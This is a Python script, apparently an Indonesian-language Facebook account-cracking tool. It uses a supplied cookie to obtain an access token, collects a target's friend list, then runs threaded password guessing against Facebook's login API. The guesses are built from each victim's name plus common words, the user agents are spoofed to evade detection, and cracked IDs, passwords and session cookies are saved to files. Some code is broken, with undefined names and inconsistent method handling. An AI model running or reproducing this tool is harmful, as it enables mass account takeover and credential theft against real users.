import os,sys,re,time,requests,random,bs4,json,time
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
ses=requests.Session()

M = "\x1b[1;91m" # MERAH
H = "\x1b[1;92m" # HIJAU
K = "\x1b[1;93m" # KUNING
N = "\x1b[0m"	# WARNA MATI
tampung = []
idz = []
ugent = []
prox = []
usragent = []
ugen2 = []
ngentott = []

for z in range(200):
	versi_android = str(random.randint(4,12))+".0.1"
	rr = random.randint
	rc = random.choice
	xio = str(random.randint(4,12))+".0.0"
	android = str(random.randint(4,12))
	versi_chrome = str(random.randint(111,555))+".0.0."+str(random.randint(10,30))+"."+str(random.randint(10,150))
	device_oppo = random.choice(["CPH1723", "CPH1901","CPH1920", "CPH1933", "CPH1937","CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269"])
	device_vivo = random.choice(["vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933", "vivo 1912","vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913", "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935"])
	device_samsung = random.choice(["SM-G975F","SM-G532G","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN"])
	device_xiaomi = random.choice(["Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G"])
	device_sony = random.choice(["E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322"])
	device_google = random.choice(["Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a"])
	device_realme = random.choice(["RMX1831","RMX1911","RMX1971","RMX2030","RMX2076","RMX2081","RMX2151","RMX2176","RMX2185","RMX2193","RMX2194","RMX2195","RMX3061","RMX3017","RMX3042","RMX1231"])
	h_sony = random.choice(["A","B","C"])
	dev = device_oppo.split(" Build/")[0]
	density = random.choice(["{density=3.0,width=720,height=1280};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=2.75,width=1080,height=2028};FB_FW/1;]"])
	jkj = str(random.randint(11111111,99999999))
	jka = str(random.randint(200600,200999))
	jkb = str(random.randint(4,13))
	jkc = str(random.randint(20000000,99999999))
	opk = random.choice(["com.facebook.katana","com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.mlite"])
	oph = random.choice(["Katana-Android","Adsmanager-Android","Facebook.lite-Android","Orca-Android","Facebook.mlite-Android"])
	mco = random.choice(["en_GB","en_US","es_MX","th_TH","pl_PL"])
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.randint(10,90)}{random.choice(az)}"
	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	ua_v = f"Mozilla/5.0 (Linux; Android {xio}; {device_vivo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(3400,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(200,700))}.0.0.{str(rr(10,30))}.{str(rr(30,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/vivo;FBBD/vivo;FBDV/{device_vivo};FBSV/{versi_android};FBOP/16]"
	ua_s = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(5000,5999))}.{str(rr(10,100))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(700,999))}.0.0.{str(rr(100,200))}.{str(rr(200,350))};]"
	ua_o = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/oppo;FBBD/oppo;FBDV/{device_oppo};FBSV/{versi_android};FBOP/18]"
	ua_r = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4400,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/Realme;FBBD/Realme;FBDV/{device_realme};FBSV/{versi_android};FBOP/19]"
	ua_d = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung} Build/TP1A.{str(rr(220000,229999))}.0{str(rr(1,30))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,130))}.0.{str(rr(5000,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(90,600))}.0.0.{str(rr(1,30))}.{str(rr(100,150))};]"
	ua_x = f"Mozilla/5.0 (Linux; Android {android}; {device_xiaomi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB;FBAV/{str(rr(300,600))}.0.0.{str(rr(10,90))}.{str(rr(100,150))};FBBV/{str(rr(200000000,299999999))};WV;FBDM/"+"{density=3.0,width=1080,height=2133};FBLC/en_US;FBRV/250292151;]"
	ua = str(rc([ua_d,ua_s]))
	if ua_s in ugent:pass
	else:ugent.append(ua_s)
	
for xcTeam in range(1000):
	rr = random.randint
	rc = random.choice
	ngentot1 = f"Mozilla/5.0 (Linux; Android 12; 21061119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
	if ngentot1 in ngentott:pass
	else:ngentott.append(ngentot1)
	ngentot2 = f"Dalvik/2.1.0 (Android 13; SM-S918B Build/TP1A.220624.014.{str(rr(111111,199999))}.001) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/ SM-S918B;FBSV/13;FBCA"
	if ngentot2 in ngentott:pass
	else:ngentott.append(ngentot2)
	ngentot3 = f"Mozilla/5.0 (Linux; Android 10; Infinix NOTE 2 LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.54 Mobile Safari/537.36"
	if ngentot3 in ngentott:pass
	else:ngentott.append(ngentot3)
	ngentot4 = f"Mozilla/5.0 (Linux; Android 10; Infinix NOTE 2 LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.54 Mobile Safari/537.36"
	if ngentot4 in ngentott:pass
	else:ngentott.append(ngentot4)

def kontol():
 rr = random.randint
 rc = random.choice
 konton = f"Mozilla/5.0 (Linux; Android {str(rr(3,9))}.{str(rr(0,1))}.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,99))}.0.{str(rr(2300,2900))}.{str(rr(75,150))} Mobile Safari/537.36"
 return random.choice([konton])
	
def usera():
	versi_android = random.randint(4,12)
	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	versi_app = random.randint(410000000,499999999)
	ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; LG-E{str(random.randint(111,999))}T Build/JDQ39B) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/Indosat Ooredoo;FBMF/LG;FBBD/LG;FBDV/Optimus G Pro;FBSV/{versi_android};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
	return ugent

	
class Main:
	
	def __init__(self):
		self.memek = []
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.hari_ini = datetime.now().strftime("%d %B %Y")
		
	def logo(self):
		os.system("clear")
		print(f"""{N}
                     _____         _____ ______  \n    ______ _________ ___(_)        __  /____  /_ \n    _  __ `/___  __ \__  / _________  __/__  __ \.\n    / /_/ / __  /_/ /_  /  _/_____// /_  _  /_/ /\n    \__,_/  _  .___/ /_/           \__/  /_.___/ \n            /_/ KaneShiro     
                                     """)
      
	def login(self):
		self.logo()
		self.url = "https://mbasic.facebook.com"
		self.ses=requests.Session()
		cok = input(" [*] masukan cookie : ")
		try:
			data, data2 = {}, {}
			link = self.ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()
			kode = link["code"];user = link["user_code"]
			print(link)
			vers = parser(self.ses.get(f"{self.url}/device", cookies={"cookie": cok}).content, "html.parser")
			item = ["fb_dtsg","jazoest","qr"]
			for x in vers.find_all("input"):
				if x.get("name") in item:
					aset = {x.get("name"):x.get("value")}
					data.update(aset)
			data.update({"user_code":user})
			print(data)
			meta = parser(self.ses.post(self.url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
			xzxz  = meta.find("form",{"method":"post"})
			for x in xzxz("input",{"value":True}):
				try:
					if x["name"] == "__CANCEL__" : pass
					else:data2.update({x['name']:x['value']})
				except Exception as e: pass
			print(data2)
			self.ses.post(f"{self.url}{xzxz['action']}", data=data2, cookies={"cookie":cok})
			tokz = self.ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()
			ff = (tokz["access_token"])
			open('cookie.txt','w').write(cok)
			open('token.txt','w').write(tokz["access_token"])
			exit()
			print(" [*] jalankan ulang script")
		except Exception as e:exit(e)

	def menu(self):
		try:
			token = open("token.txt","r").read()
			cok = open("cookie.txt","r").read()
			cookie = {"cookie":cok}
			nama = ses.get(f"https://graph.facebook.com/me?access_token={token}",cookies=cookie).json()["name"]
		except:
			try:os.remove("cookie.txt")
			except:pass
			try:os.remove("token.txt")
			except:pass
			self.login()
		self.logo()
		print(f"{N} [*] Bergabung   : {self.hari_ini}")
		print(f" [*] Status      : {H}Premium{N}")
		print(" [*] ---------------------------------------------")
		print(f" [*] IP          : {self.ip}\n")
		print(" [01]. crack dari file")
		print(" [02]. crack dari id publik")
		print(" [03]. lihat akun hasil crack")
		print(f" [{M}00{N}]. logout (hapus login)")
		ask = input("\n [?] pilih : ")
		if ask in["1","01"]:
			fol = input("\n [*] masukan nama file : ")
			file = open(f"{fol}","r").read().splitlines()
			for z in file:
				idz.append(z)
			Crack().atursandi()
		elif ask in["2","02"]:
			print (" [*] isi 'me' jika ingin crack dari daftar teman")
			user = input(" [*] masukan id atau username : ")
			self.publik(user,token,cookie)
			Crack().atursandi()
		elif ask in["0","00"]:
			try:os.remove("cookie.txt")
			except:pass
			try:os.remove("token.txt")
			except:pass
			exit(" [+] berhasil menghapus login")
		
	def publik(self,user,token,cookie):
		try:
			url = ses.get(f"https://graph.facebook.com/v1.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie)
			jason = json.loads(url.text)
			for i in jason["friends"]["data"]:
				idz.append(i["id"]+"<=>"+i["name"])
				sys.stdout.write(f"\r [*] sedang mengumpulkan {len(idz)} id....");sys.stdout.flush()
		except Exception as e:
			print(e)
		
class Crack:
	
	def __init__(self):
		self.loop = 0
		self.ok = []
		self.cp = []
		self.mtd = []
		self.hari_ini = datetime.now().strftime("%A-%d-%B-%Y")+".txt"
		
	def atursandi(self):
		print(f"\n\n [+] total id -> {M}{len(idz)}{N}")
		ask = input(" [?] apakah anda ingin menggunakan sandi manual? [Y/t]:")
		print("\n [ pilih method login - silahkan coba satu² ]\n")
		print(" [1]. method api")
		print(" [2]. method mobile")
		method = input("\n [?] method : ")
		if method in["1","01"]:
			self.mtd.append("api")
		elif method in["2","02"]:
			self.mtd.append("api")
		elif method in["3","03"]:
			self.mtd.append("mobile")
		for urutan in idz:
			xx = random.randint(0,len(tampung))
			tampung.insert(xx,urutan)
		if ask in["y","Y"]:
			print ("\n [!] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih")
			pwx = input("\n [?] masukan kata sandi : ")
			if len(pwx) < 6:
				exit(" [!] kata sandi minimal 6 karakter")
			print(f" [*] crack dengan sandi -> [{M}{','.join(x for x in pwx.split(','))}{N}]")
			self.manual(pwx)
		else:
			self.otomatis()
		
	def manual(self,pw):
		with ThreadPoolExecutor(max_workers=30) as fall:
			self.simpan_hasil()
			for data in tampung:
				try:
					pwx = []
					user = data.split("<=>")[0]
					for x in pw.split(","):
						pwx.append(x)
					if "api" in self.mtd:
						fall.submit(self.metode_api,user,pwx)
					elif "mbasic" in self.mtd:
						fall.submit(self.metode_reguvali,user,pwx,url)
					elif "mobile" in self.mtd:
						fall.submit(self.metode_messenger,user,pwx)
				except:
					if "api" in self.mtd:
						fall.submit(self.metode_api,user,pwx,url)
					elif "reguvali" in self.mtd:
						fall.submit(self.metode_reguvali,user,pwx,url)
					elif "messenger" in self.mtd:
						fall.submit(self.metode_messenger,user,pwx)

	def otomatis(self):
		global prog,des
		prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}% ]'))
		des = prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpan_hasil()
				for data in tampung:
					try:
						pwx = []
						user = data.split("<=>")[0]
						nama = data.split("<=>")[1]
						depan = nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:
								pass 
							else:
								pwx.append(depan+"123")
								pwx.append(depan+"321")
								pwx.append(depan+"1234")
								pwx.append(depan+"12345")
								pwx.append("ganteng")
								pwx.append("sayangku")
								pwx.append("ganteng123")
								pwx.append("katasandi")
								pwx.append("pekalongan")
								pwx.append("semarang")
						else:
							if len(depan)<3:
								pwx.append(nama)
								pwx.append(nama+"123")
								pwx.append(nama+"321")
							else:
								pwx.append(nama)
								pwx.append(depan+"123")
								pwx.append(depan+"321")
								pwx.append(depan+"1234")
								pwx.append(depan+"12345")
								pwx.append("kata sandi")
								pwx.append("pekalongan")
								pwx.append("semarang")
							belakang = nama.split(" ")[1]
							if len(belakang)<3:
								pwx.append(depan+belakang)
								pwx.append(depan+belakang+"123")
								pwx.append(depan+belakang+"321")
								pwx.append(depan+belakang+"1234")
								pwx.append(depan+belakang+"12345")
							else:
								pwx.append(depan+belakang)
								pwx.append(belakang+"123")
								pwx.append(belakang+"321")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345")
								pwx.append("kontol")
								pwx.append("kontol123")
								pwx.append("bismillah")
								pwx.append("mobile legends")
								pwx.append("batang")
								pwx.append("pemalang")
								pwx.append("paninggaran")
					if "api" in self.mtd:
						fall.submit(self.metode_api,user,pwx)
					elif "mbasic" in self.mtd:
						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
					elif "mobile" in self.mtd:
						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
				except:
					if "api" in self.mtd:
						fall.submit(self.metode_api,user,pwx)
					elif "mbasic" in self.mtd:
						fall.submit(self.metode_aplikasi,user,pwx)
					elif "mobile" in self.mtd:
						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
		exit("\n\n [#] crack selesai....")
	
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}• {P2}[{H2}DensXyz{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				ua = random.choice(ugent)
				ua = random.choice(ngentott)
				params = {
					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
					"sdk_version": {random.randint(1,26)}, 
					"email": email,
					"locale": "en_US",
					"password": pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
				headers = {
					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": ua,
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
				}
				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
				if "session_key" in post.text and "EAA" in post.text:
					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
					user = re.findall("c_user=(\d+)",coki)[0]
					if user in self.ok or user in self.cp:

						break
					else:
						self.ok.append(user)
						tree = Tree(" ",guide_style=f"{color_ok}")
						tree.add(Panel(f"{H2}       Succes-Login{P2}",width=30,padding=(0,2),style=f"{color_ok}"))
						tree.add(f"\r{P2}User ID {P2}  : {H2}{user}")
						tree.add(f"{P2}Password {P2} : {H2}{pw}")
						tree.add(Panel(f"{H2}{coki}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
						tree.add(Panel(f"{H2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
						prints(tree)
						
						#print('\n')
						#Console(width=87).print(Panel(f"[bold green]{coki}", style='bold green'),justify='left')
						#print('\n')
						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\n")
						break
				elif "User must verify their account" in post.text:
					user = post.json()["error"]["error_data"]["uid"]
					if user in self.ok or user in self.cp:
						break
					else:
						self.cp.append(user)
						tree = Tree(" ",guide_style=f"{color_cp}")
						tree.add(Panel(f"{K2}   Checkpoint-Login{P2}",width=30,padding=(0,2),style=f"{color_cp}"))
						tree.add(f"\r{P2}User ID {P2}     : {K2}{user}")
						tree.add(f"{P2}Password {P2}    : {K2}{pw}")
						tree.add(Panel(f"{K2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_cp}"))
						prints(tree)
						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
						break
				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
					prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
					prog.advance(des)
					time.sleep(30)
				else:continue
		except ConnectionError:
			time.sleep(30)
			self.metode_api(user,pwx)
		self.loop +=1
		
					
	def simpan_hasil(self):
		print(f"\n [+] hasil OK disimpan ke : OK/{self.hari_ini}")
		print(f" [+] hasil CP disimpan ke : CP/{self.hari_ini}")
		print("\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n")
		
if __name__=="__main__":
	#generate_ugent()
	#print(generate_air())
	Main().menu()
